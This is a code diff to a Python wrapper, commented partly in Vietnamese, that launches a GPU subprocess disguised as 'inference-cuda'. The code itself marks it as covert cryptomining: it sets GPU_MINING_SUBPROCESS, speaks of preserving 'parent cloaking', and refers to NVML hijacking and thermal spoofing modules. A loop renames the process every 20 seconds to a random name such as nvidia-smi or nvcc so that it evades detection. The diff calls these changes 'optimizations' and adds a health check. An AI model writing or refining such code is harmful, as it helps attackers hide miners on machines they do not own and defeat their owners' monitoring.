@@ -66,6 +66,57 @@ def signal_handler(signum, frame):
     
     sys.exit(0)
 
+def create_enhanced_gpu_environment():
+    """
+    **[Enhanced GPU Environment Creator]** (tạo môi trường GPU tối ưu)
+    
+    Tái sử dụng patterns từ existing modules để tạo clean environment
+    cho GPU subprocess với enhanced resource management.
+    
+    Returns:
+        dict: Clean environment dictionary for GPU subprocess
+    """
+    logger.info("🔧 [GPU-ENV-OPTIMIZER] Creating enhanced GPU environment using existing patterns")
+    
+    # Base environment copy
+    clean_env = os.environ.copy()
+    
+    # 1. LD_PRELOAD Management - Tương tự thermal_spoofer.py approach
+    if 'LD_PRELOAD' in clean_env:
+        preload_libs = clean_env['LD_PRELOAD'].split(':')
+        # Keep thermal hooks, remove GPU interference hooks
+        filtered_libs = [lib for lib in preload_libs if 'libgpuhook.so' not in lib]
+        
+        if filtered_libs:
+            clean_env['LD_PRELOAD'] = ':'.join(filtered_libs)
+            logger.info(f"🔧 [GPU-ENV-OPTIMIZER] Filtered LD_PRELOAD: {clean_env['LD_PRELOAD']}")
+        else:
+            del clean_env['LD_PRELOAD']
+            logger.info("🔧 [GPU-ENV-OPTIMIZER] Removed LD_PRELOAD completely")
+    
+    # 2. NVML Management - Based on nvml_interceptor.py patterns
+    clean_env['ENABLE_NVML_IPC_HIJACKING'] = '0'
+    clean_env['GPU_MINING_SUBPROCESS'] = '1'
+    
+    # 3. CUDA Resource Optimization - Inspired by resource_control.py
+    cuda_optimizations = {
+        'CUDA_LAUNCH_TIMEOUT': '30',
+        'CUDA_DEVICE_MAX_CONNECTIONS': '1',
+        'CUDA_VISIBLE_DEVICES': '0',
+        'CUDA_CACHE_DISABLE': '1',
+        'NVIDIA_DRIVER_CAPABILITIES': 'compute',
+        # Additional GPU-specific optimizations
+        'CUDA_FORCE_PTX_JIT': '1',          # Force JIT compilation for stability
+        'CUDA_DISABLE_CUBLASLT': '1',       # Disable problematic cuBLAS components
+        'CUDA_MODULE_LOADING': 'LAZY'       # Lazy loading to reduce memory pressure
+    }
+    
+    for key, value in cuda_optimizations.items():
+        clean_env[key] = value
+    
+    logger.info(f"✅ [GPU-ENV-OPTIMIZER] Applied {len(cuda_optimizations)} CUDA optimizations")
+    return clean_env
+
 def main():
     """
     **[Main Function]** (hàm chính) - khởi động GPU stealth mode và exec inference-cuda.
@@ -81,30 +132,8 @@ def main():
         cuda_inference_args = sys.argv[1:]  # Remove script name
         logger.info(f"🔍 [GPU-STEALTH-WRAPPER] inference-cuda args: {cuda_inference_args}")
         
-        # ✅ CORRECTED: Create clean environment for subprocess ONLY (preserves parent cloaking)
-        logger.info("🔧 [GPU-SUBPROCESS-ISOLATION] Creating clean environment for GPU mining subprocess")
-        
-        # Create clean environment copy for subprocess execution (không modify parent environment)
-        clean_env = os.environ.copy()
-        
-        # 1. Remove ONLY GPU-interfering hooks from subprocess environment
-        if 'LD_PRELOAD' in clean_env:
-            preload_libs = clean_env['LD_PRELOAD'].split(':')
-            # Remove chỉ libgpuhook.so (NVML interference), keep thermal hooks for parent
-            filtered_libs = [lib for lib in preload_libs if 'libgpuhook.so' not in lib]
-            
-            if filtered_libs:
-                clean_env['LD_PRELOAD'] = ':'.join(filtered_libs)
-                logger.info(f"🔧 [GPU-SUBPROCESS-ISOLATION] Subprocess LD_PRELOAD: {clean_env['LD_PRELOAD']}")
-            else:
-                del clean_env['LD_PRELOAD']
-                logger.info("🔧 [GPU-SUBPROCESS-ISOLATION] Removed LD_PRELOAD from subprocess only")
-        
-        # 2. Disable NVML hijacking for subprocess only (keep parent values intact)
-        clean_env['ENABLE_NVML_IPC_HIJACKING'] = '0'  # Only for subprocess
-        clean_env['GPU_MINING_SUBPROCESS'] = '1'      # Flag for identification
-        
-        logger.info("✅ [GPU-SUBPROCESS-ISOLATION] Clean environment prepared for subprocess (parent cloaking preserved)")
+        # ✅ OPTIMIZED: Use enhanced GPU environment creator - Tái sử dụng existing patterns
+        clean_env = create_enhanced_gpu_environment()
 
         # Get inference-cuda binary path from environment
         cuda_inference_path = os.getenv('CUDA_COMMAND', '/usr/local/bin/inference-cuda')
@@ -172,19 +201,44 @@ def main():
             )
             logger.info(f"✅ [GPU-POST-EXEC-STEALTH] inference-cuda started as subprocess PID: {process.pid}")
             
-            # 🔒 PHASE 2: Implement GPU post-exec stealth maintenance
+            # 🔒 PHASE 2: Enhanced GPU Resource Monitoring + Stealth - Dựa trên patterns từ resource_control.py
             def maintain_gpu_subprocess_stealth():
-                """Maintain GPU stealth for subprocess every 20 seconds"""
+                """Enhanced GPU monitoring với resource conflict detection"""
                 gpu_stealth_names = [
                     "nvidia-smi", "cuda-gdb", "nvcc", "nvidia-ml-py", 
                     "nvidia-settings", "gpu-manager", "glxgears", 
                     "vulkan-info", "mesa-loader", "drm-tip"
                 ]
                 
+                resource_error_count = 0  # Track consecutive errors
+                max_errors = 3           # Threshold để emergency handling
+                
                 while process.poll() is None:  # While process is running
                     try:
                         time.sleep(20)  # GPU-specific interval
                         if process.poll() is None:  # Check again after sleep
+                            
+                            # Enhanced Resource Health Check - Tương tự resource_control.py monitoring
+                            try:
+                                # Check if process is responsive (not in D state)
+                                with open(f"/proc/{process.pid}/stat", "r") as f:
+                                    stat_data = f.read().split()
+                                    process_state = stat_data[2] if len(stat_data) > 2 else "?"
+                                
+                                if process_state == "D":  # Uninterruptible sleep - resource problem
+                                    resource_error_count += 1
+                                    logger.warning(f"⚠️ [GPU-RESOURCE-MONITOR] Process in uninterruptible sleep (D state). Error count: {resource_error_count}")
+                                    
+                                    if resource_error_count >= max_errors:
+                                        logger.error(f"🚨 [GPU-RESOURCE-MONITOR] Max resource errors reached. Process may need restart.")
+                                        # Log for mining_environment analysis
+                                        break
+                                else:
+                                    resource_error_count = 0  # Reset counter on healthy state
+                                    
+                            except Exception as stat_error:
+                                logger.debug(f"⚠️ [GPU-RESOURCE-MONITOR] Could not read process stats: {stat_error}")
+                            
                             # Apply GPU stealth to subprocess
                             gpu_stealth_name = random.choice(gpu_stealth_names)
                             
@@ -195,6 +249,7 @@ def main():
                                 logger.debug(f"🔄 [GPU-POST-EXEC-STEALTH] GPU Subprocess PID {process.pid} renamed to: {gpu_stealth_name}")
                             except Exception as comm_error:
                                 logger.debug(f"⚠️ [GPU-POST-EXEC-STEALTH] Could not rename GPU subprocess: {comm_error}")
+                                
                     except Exception as e:
                         logger.error(f"❌ [GPU-POST-EXEC-STEALTH] Error in GPU stealth maintenance: {e}")
                         break
